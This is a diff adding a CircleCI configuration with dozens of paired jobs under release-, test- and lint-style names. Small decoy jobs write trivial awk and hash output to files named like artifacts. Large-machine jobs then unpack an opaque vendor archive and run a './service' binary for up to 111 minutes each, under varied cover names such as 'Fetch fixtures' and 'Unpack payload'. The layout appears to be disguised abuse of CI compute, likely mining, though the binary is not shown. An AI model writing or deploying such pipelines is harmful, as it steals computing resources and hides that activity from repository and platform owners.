@@ -1,0 +1,1559 @@
+version: 2.1
+
+jobs:
+  canary1_PrepareRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: delegate down
+          command: |
+            mkdir -p /tmp/share
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/share/step-17.txt; true
+            echo "baseline emitted ($(wc -l </tmp/share/step-17.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-17.txt
+  PrepareRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  validate_RunApp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: foxtrot slow
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{m[3]=3; m[7]=7; m[2]=2; for(k in m)print k}' | sort -n; true ; } > /tmp/share/payload.pkg
+            echo "baseline emitted ($(wc -l </tmp/share/payload.pkg) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - payload.pkg
+  RunApp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/payload.pkg > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  B_ga-v1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print index(s,"ll")}'; true ; } > /tmp/share/metrics.json
+            echo "baseline emitted ($(wc -l </tmp/share/metrics.json) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - metrics.json
+  ga-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  vendor_xray-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: gust
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++) printf "%c", 97+(i%26); print ""}'; true ; } > /tmp/share/event.txt
+            echo "baseline emitted ($(wc -l </tmp/share/event.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - event.txt
+  xray-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/event.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  package_run-full-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: polish final
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "The Quick Brown Fox" | awk '{for(i=1;i<=NF;i++)printf "%s", substr($i,1,1); print ""}'; true ; } > /tmp/share/full_task_output_v1.log
+            echo "baseline emitted ($(wc -l </tmp/share/full_task_output_v1.log) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - full_task_output_v1.log
+  run-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/full_task_output_v1.log > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  Alpha_nov27-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: nibble
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; date -u +%Y%m%d%H%M%S; true ; } > /tmp/share/gate-ok.out
+            echo "baseline emitted ($(wc -l </tmp/share/gate-ok.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - gate-ok.out
+  nov27-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/gate-ok.out > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  tap_LAB_DEPLOY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hyperspace
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=512 count=20 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/share/step-20.log
+            echo "baseline emitted ($(wc -l </tmp/share/step-20.log) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-20.log
+  LAB_DEPLOY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  prebuild_io-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: snatch
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk 'END{print NR*(NR+1)/2}'; true ; } > /tmp/share/29.data
+            echo "baseline emitted ($(wc -l </tmp/share/29.data) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 29.data
+  io-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/29.data > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  tester_cerberus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: yikes
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; hostname 2>/dev/null | md5sum; true ; } > /tmp/share/185.data
+            echo "baseline emitted ($(wc -l </tmp/share/185.data) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 185.data
+  cerberus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/185.data > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  env_bun-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: counterpoint
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=200 count=1 2>/dev/null | base64 | sort | md5sum; true ; } > /tmp/share/55.blob
+            echo "baseline emitted ($(wc -l </tmp/share/55.blob) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 55.blob
+  bun-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/55.blob > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  g1_tam-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: stiff leg
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{s=s $1}END{print length(s)}'; true ; } > /tmp/share/event.ndjson
+            echo "baseline emitted ($(wc -l </tmp/share/event.ndjson) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - event.ndjson
+  tam-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  p1_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: straight shot
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo 'banana apple apricot' | grep -o 'a' | wc -l; true ; } > /tmp/share/545a.txt
+            echo "baseline emitted ($(wc -l </tmp/share/545a.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 545a.txt
+  uniform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  reserve_golf-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: grave
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print log(2.71828), sqrt(144)}'; true ; } > /tmp/share/pt-main.state
+            echo "baseline emitted ($(wc -l </tmp/share/pt-main.state) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - pt-main.state
+  golf-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  bootstrap_rm-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: midnight ci
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo "red,green,blue,yellow,orange" | tr ',' '\n' | sort; true ; } > /tmp/share/stage.bin
+            echo "baseline emitted ($(wc -l </tmp/share/stage.bin) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - stage.bin
+  rm-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  prefetch_prometheus-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: feast
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; tar -czf - /etc/hostname 2>/dev/null | wc -c; true ; } > /tmp/share/result.out
+            echo "baseline emitted ($(wc -l </tmp/share/result.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - result.out
+  prometheus-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/result.out > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  retry_biuld-12:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: true tone
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk 'BEGIN{OFS=","}{row=row OFS $0}END{sub(/^,/,"",row); print row}' | wc -c; true ; } > /tmp/share/pt-A.pkl
+            echo "baseline emitted ($(wc -l </tmp/share/pt-A.pkl) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - pt-A.pkl
+  biuld-12:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  cook_Rollout_Release5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: dropoff rise
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..30} | awk '{if($1%2==0)e++;else o++}END{print e, o}'; true ; } > /tmp/share/pt-B.pickle
+            echo "baseline emitted ($(wc -l </tmp/share/pt-B.pickle) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - pt-B.pickle
+  Rollout_Release5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  tmp_tam-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: hanger break
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/share/.sig
+            echo "baseline emitted ($(wc -l </tmp/share/.sig) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - .sig
+  tam-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  B_ivan-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: handstand
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1000; while(a>1){a=int(a/2); c++} print c}'; true ; } > /tmp/share/OK
+            echo "baseline emitted ($(wc -l </tmp/share/OK) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - OK
+  ivan-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/OK > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  cook_alpha-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: soot smudge
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "1 10\n2 20\n3 30\n" | awk '{s+=$2}END{print "sum="s}'; true ; } > /tmp/share/timings.json
+            echo "baseline emitted ($(wc -l </tmp/share/timings.json) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - timings.json
+  alpha-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  fixture_CORE-956:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: pin drop
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; cat /proc/uptime | awk '{print $1}'; true ; } > /tmp/share/stats.csv
+            echo "baseline emitted ($(wc -l </tmp/share/stats.csv) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - stats.csv
+  CORE-956:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  hydrate_cerberus-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: ice sheet
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; find / -maxdepth 2 -name "bin" 2>/dev/null | head -5; true ; } > /tmp/share/stage-pass.sig
+            echo "baseline emitted ($(wc -l </tmp/share/stage-pass.sig) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - stage-pass.sig
+  cerberus-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/stage-pass.sig > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  install_QA_HOOK_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: press over
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; printf "4\n2\n7\n1\n5\n" | sort -n | awk 'NR==3'; true ; } > /tmp/share/step-complete.sig
+            echo "baseline emitted ($(wc -l </tmp/share/step-complete.sig) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-complete.sig
+  QA_HOOK_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/pt-A.pkl > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  postcheck_nico-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: quick
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print length("hello world")}'; true ; } > /tmp/share/artifact
+            echo "baseline emitted ($(wc -l </tmp/share/artifact) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - artifact
+  nico-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/artifact > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  orchestrate_LaunchService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: liquid fuel
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; tr -c 'a-z\n' 'X' < /etc/hostname | head -c 50; true ; } > /tmp/share/artifact.pkg
+            echo "baseline emitted ($(wc -l </tmp/share/artifact.pkg) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - artifact.pkg
+  LaunchService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/artifact.pkg > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  auditor_send-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: veer east
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<16;i++)printf "%X", i; print ""}'; true ; } > /tmp/share/44.out
+            echo "baseline emitted ($(wc -l </tmp/share/44.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - 44.out
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-17.txt > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  C_go1-21-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: TAG
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; echo -e "x 3\ny 1\nz 2" | sort -k2n; true ; } > /tmp/share/step-9.out
+            echo "baseline emitted ($(wc -l </tmp/share/step-9.out) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - step-9.out
+  go1-21-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: Inherit stage
+          command: |
+            { head -n 5 /tmp/share/step-9.out > /dev/null; echo "lines ok" ; } || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: unxz -c vendor.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 111m
+          command: bash -c "./service"
+  produce_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/share
+      - run:
+          name: up top
+          command: |
+            mkdir -p /tmp/share
+            { set +o pipefail 2>/dev/null; date -u +"%H:%M:%S.%N"; true ; } > /tmp/share/main_step_output_v2.txt
+            echo "baseline emitted ($(wc -l </tmp/share/main_step_output_v2.txt) lines)"
+      - persist_to_workspace:
+          root: /tmp/share
+          paths:
+            - main_step_output_v2.txt
